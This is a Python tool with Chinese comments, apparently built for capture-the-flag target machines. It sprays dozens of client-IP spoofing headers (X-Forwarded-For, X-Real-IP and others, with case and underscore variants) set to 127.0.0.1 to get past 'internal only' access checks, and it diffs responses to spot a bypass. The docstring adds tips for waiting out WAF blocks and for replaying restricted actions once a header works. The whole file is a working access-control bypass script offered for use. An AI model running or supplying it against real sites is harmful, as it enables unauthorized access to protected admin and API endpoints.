#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
iphdr_matrix.py —— IP 头矩阵穷举器（来源校验类题的通用武器）

用途：靶机上「要求内部来源 / 只许本机访问 / 403 但提示来自内部」这类题，
      每一道题只认**一个**头名，手工试一个换一个极慢。本脚本把整个矩阵一次打全。

依据（实测）：IP 头系列题里 6 道题各认一个不同的头名；
             605 未攻克 = 50+ 变体全不认 —— 属穷举型收尾题。

用法：
  python iphdr_matrix.py "<URL>" [--value VALUE] [--method GET|POST] [--data "..."] \
      [--proxy http://127.0.0.1:8080] [--timeout 8] [--threads 8]

示例：
  python iphdr_matrix.py "http://TARGET/admin/index.php"
  python iphdr_matrix.py "http://TARGET/api/user" --data '{"id":1}' --method POST
  python iphdr_matrix.py "http://TARGET/flag" --value 127.0.0.1

读结果（关键）：
  ★ 判「命中」不能只看状态码变 200 —— 要看**响应体是否真的变了**。
    脚本会给每个变体算 (状态码, 长度, 正文哈希前 8 位)，并和基线对比：
      [HIT]  = 状态码或长度与基线不同（值得人工看一眼）
      [SAME] = 与基线完全一致（该头名无效）
  静态欢迎页 / 同一错误页会让大量变体返回 200，别被状态码骗了。

无命中时怎么办（别在同一个头名上加大力度）：
  1. 看题面 / 源码注释找线索（有的题题干里就写着头名）
  2. 试非标准头名：X-Forwarded-Host / X-Client-IP 变体 / 自定义公司头（如 X-Company-Real-IP）
  3. 试放 query 参数 / POST body 字段（同名不同位）
  4. 隔 60 秒用干净 payload 复测一次（WAF 冷却会伪装成 401/403）
"""

import argparse
import hashlib
import sys
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

# ★ Windows 控制台默认 GBK，中文输出会乱码（实测坑）⇒ 强制 UTF-8 输出
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

# 头名矩阵（按实测命中率排序）
HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Client-IP", "True-Client-IP",
    "X-Cluster-Client-IP", "CF-Connecting-IP", "Proxy-Client-IP",
    "WL-Proxy-Client-IP", "Cdn-Src-Ip", "Ali-CDN-Real-IP",
    "Fastly-Client-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "X-Forwarded", "Forwarded-For", "X-ProxyUser-Ip", "Client-IP",
    "X-Originating", "X-Forwarded-Host", "X-Host", "X-Original-URL",
]

# 头名变体生成（大小写 / 下划线 / 去横线）
def name_variants(name: str):
    yield name
    yield name.lower()
    yield name.upper()
    yield name.replace("-", "_")          # 下划线变体（不少框架规范化成这个）
    yield name.replace("-", "_").upper()
    yield name.replace("-", "")           # 去横线变体


def probe(url, header_name, value, method, data, proxy, timeout, baseline):
    req = urllib.request.Request(url, method=method.upper())
    req.add_header(header_name, value)
    req.add_header("User-Agent", "Mozilla/5.0 (iphdr-matrix)")
    if data:
        req.data = data.encode("utf-8")
        req.add_header("Content-Type", "application/json")
    handlers = []
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read()
            code = resp.status
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else b""
        code = e.code
    except Exception as e:                                  # 连接层失败
        return header_name, None, 0, str(e)[:60], None
    digest = hashlib.sha256(body).hexdigest()[:8]
    same = (baseline is not None and code == baseline[0] and len(body) == baseline[1])
    return header_name, code, len(body), digest, same


def main():
    ap = argparse.ArgumentParser(add_help=True)
    ap.add_argument("url")
    ap.add_argument("--value", default="127.0.0.1",
                    help="头值（可试 127.0.0.1 / localhost / 10.0.0.1 / 目标内网网关）")
    ap.add_argument("--method", default="GET")
    ap.add_argument("--data", default=None)
    ap.add_argument("--proxy", default=None, help="抓包代理，如 http://127.0.0.1:8080")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--threads", type=int, default=8, help="并发（薄容器别超过 4-6）")
    ap.add_argument("--no-variants", action="store_true", help="只试标准头名")
    args = ap.parse_args()

    print("=" * 78)
    print(f"目标   : {args.url}")
    print(f"头值   : {args.value}      方法: {args.method}      并发: {args.threads}")
    if args.proxy:
        print(f"代理   : {args.proxy}")
    print("=" * 78)

    # 基线：不带任何头
    base = probe(args.url, "X-Nothing-Baseline", "x", args.method, args.data,
                 args.proxy, args.timeout, None)
    baseline = (base[1], base[2]) if base[1] else None
    print(f"基线   : status={base[1]}  len={base[2]}\n")

    tasks = []
    for name in HEADERS:
        names = [name] if args.no_variants else list(name_variants(name))
        for n in names:
            tasks.append(n)

    hits = []
    with ThreadPoolExecutor(max_workers=max(1, args.threads)) as pool:
        futs = {pool.submit(probe, args.url, n, args.value, args.method, args.data,
                            args.proxy, args.timeout, baseline): n for n in tasks}
        for fut in as_completed(futs):
            name, code, length, digest, same = fut.result()
            if code is None:
                print(f"  [ERR ] {name:<28} {digest}")
                continue
            mark = "[SAME]" if same else "[HIT ]"
            print(f"  {mark} {name:<28} status={code}  len={length}  body={digest}")
            if not same:
                hits.append((name, code, length, digest))

    print("\n" + "=" * 78)
    if hits:
        print(f"差异变体 {len(hits)} 个（逐个人工确认响应体内容，别只看状态码）：")
        for name, code, length, digest in hits:
            print(f"  {name:<28} status={code}  len={length}  body={digest}")
        print("\n命中后：带这个头重放整个受限动作（不只是 GET 首页）。")
    else:
        print("全部与基线一致。按脚本头部「无命中时怎么办」四步走，别在同一个头名加大力度。")
    print("=" * 78)


if __name__ == "__main__":
    sys.exit(main())
